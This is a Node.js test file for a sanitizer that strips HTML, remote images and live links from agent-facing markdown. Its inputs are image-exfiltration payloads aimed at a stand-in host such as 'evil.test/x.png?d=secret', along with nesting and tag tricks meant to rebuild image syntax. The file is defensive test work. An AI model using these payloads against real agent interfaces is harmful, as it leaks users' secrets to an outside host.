import { test } from 'node:test';
import assert from 'node:assert/strict';
import { agentMarkdown } from '../lib/agent-markdown.js';

test('agent markdown keeps formatting but drops HTML, remote images and live links', () => {
  assert.equal(agentMarkdown('Uses `workflowItems` and **keeps** order.'), 'Uses `workflowItems` and **keeps** order.');
  assert.equal(agentMarkdown('See ![chart](https://evil.test/x.png?d=secret)'), 'See chart');
  assert.equal(agentMarkdown('Open [the docs](https://evil.test/login "t")'), 'Open the docs (https://evil.test/login)');
  assert.equal(agentMarkdown('<img src="https://evil.test/p"><b>bold</b>'), 'bold');
  assert.equal(agentMarkdown(null), '');
});

test('reference images, reference links, definitions and multi-line tags are neutralized too', () => {
  assert.equal(agentMarkdown('![a][ref]\n\n[ref]: https://evil.test/x.png?d=secret').trim(), 'a');
  assert.equal(agentMarkdown('![shortcut]\n[shortcut]: https://evil.test/s.png').trim(), 'shortcut');
  assert.equal(agentMarkdown('Go to [docs][1]\n[1]: https://evil.test').trim(), 'Go to docs');
  assert.equal(agentMarkdown('<img\n src="https://evil.test/p">done'), 'done');
});

test('no image syntax survives nesting or tags that rebuild it', () => {
  for (const input of ['![a[b]](https://evil.test/x.png)', '!<b></b>[x](https://evil.test/y.png)', '!<<b>i>[x](https://evil.test/z.png)', '! [x](https://evil.test/w.png)']) {
    assert.doesNotMatch(agentMarkdown(input), /!\s*\[/, input);
    assert.doesNotMatch(agentMarkdown(input), /<|>/, input);
  }
});
